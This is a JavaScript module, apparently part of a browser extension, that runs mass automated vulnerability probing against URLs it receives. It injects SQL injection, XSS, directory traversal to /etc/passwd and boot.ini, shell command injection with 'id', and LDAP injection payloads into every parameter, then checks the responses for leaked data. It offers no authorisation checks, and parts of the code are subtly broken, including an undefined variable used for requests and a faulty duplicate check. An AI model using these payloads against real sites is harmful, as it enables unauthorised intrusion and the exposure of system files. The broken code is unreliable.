/*
	sha0()badchecksum.net
	Mass url audit
*/

var ah = new AttackHelper();

audit = {

	table: null,
	audited: [],

	bd: [
			{
				type: 'sql injection',
				att:  ['%27%22%25%32%37%25%32%32\'\"\\C0\''],
				resp: ['ORA\-','ODBC','MySQL',' SQL','Dataset not defined'],
			},{
				type: 'Cross Site Scripting',
				att:  ['wewe"wewe%27wewe\'wewe%22wewe>wewe<wewe'],
				resp: ['wewe"wewe','wewe\'wewe','wewe>wewe','wewe<wewe']
			},{
				type: 'Directory transversal',
				att:  ['../../../../../../../../../../etc/passwd','../../../../../../../../../../etc/passwd%00','../../../../../../../../../../boot.ini','%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34','%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%32%25%36%66%25%36%66%25%37%34%25%32%65%25%36%39%25%36%65%25%36%39'],
				resp: ['root:0:','\\[boot loader\\]','root:0','\\[boot loader\\]']
			},{
				type: 'Command execution',
				att:  ['|id+#','`id`','$(id)',';id+#',';id+&'], // unified: att: ['|id+#+$(id)+#+`id`;id+#;'],
				resp: ['gid=']
			},{
				type: 'LDAP Injection',
				att:  [')(|(cn=*))','(((((',')))))'],
				resp: ['LDAP',',dc=']
			}
	]
};

audit.coloredParams = function(pparams) {
	var params = new RegExp(/([^?&]*)=([^&]*)/g);
		var strparams = '';

    while (1) {
        var p = params.exec(pparams);
        if (!p)
            break;

        strparams += ah.gct(p[1], colors.green)+'='+ah.gct(p[2], colors.red)+'&';
    }

    return strparams;
};

audit.coloredUrl = function(durl) {
	var strparams = '';
	var spl = durl.split('?');
	var url = '';
	if (spl.length > 1)
        url = ah.gct(spl[0],colors.dark)+'?'+audit.coloredParams(spl[1]);

    if (url == '')
    	url = durl;

    return url;
};


audit.init = function() {
	audit.table = new Table('tblData');

    chrome.extension.sendMessage({
        method: 'attackRunning',
        module: 'mass audit',
        url: ''
    });

    http.queued = 0;
	http.on('data',function(resp) {
		var vuln = resp.tag;
		if (resp.data) {
			audit.table.addRow(['<b>'+vuln.type+' found!!</b>']);
			audit.table.addRow([ah.getLink2(resp.url, audit.coloredUrl(resp.url))]);
			if (resp.post)
				audit.table.addRow([audit.coloredUrl(resp.post)]);

			vuln.resp.forEach(function(pattern) {
				var occ = resp.data.search(pattern);
				if (occ >= 0) {
					audit.table.addRow(['data:    '+resp.data.substring(occ-40,occ+60)]);
				}
			});
		}
	});
	http.on('end',audit.end);

	audit.urlReceiver();
	console.log('listener enabled!');

	chrome.extension.sendMessage({method:'auditReady'});
};

audit.end = function() {
    chrome.extension.sendMessage({
        method: 'attackFinished',
        module: 'mass audit',
        url: ''
    });
};


audit.checkUrl = function(url) {
	var xurl =	url.replace(/=[^=&?]*/ig,'');
	if (xurl in audit.audited)
		return;

	audit.audited.push(xurl);

	audit.bd.forEach(function(vuln) {
		http.queued++;

		vuln.att.forEach(function(att) {
			var data = url.replace(/=[^=&?]*/ig,'='+att);

			if (data.search(' ')>0) {
				//POST
				var spl = data.split(' ');
				var url = spl[0];
				var post = spl[1];

				http.asyncGet(url,post,null,null,vuln);
				window.status = u;

			} else {
				// GET
				http.asyncGet(u,null,null,null,vuln);
				window.status = u;
			}
		});
	});
};

audit.urlReceiver = function() {
	chrome.extension.onMessage.addListener(function(msg,sender,send) {
		if (msg.method != 'audit')
			return;

		if (!msg.urls)
			return;

		if (!msg.data) {
			console.log('inncoming urls');
			msg.urls.forEach(function(url) {
				if (url.search(/\?/)>0 || url.search(' ')>0)
					audit.checkUrl(url);
			});

		} else {
			//logger.writeln('POST '+ah.getLink2(msg.url+'##post##'+msg.data, logger.coloredUrl(msg.url)+' &nbsp; '+logger.coloredParams(msg.data)));
		}
	});
};


audit.init();
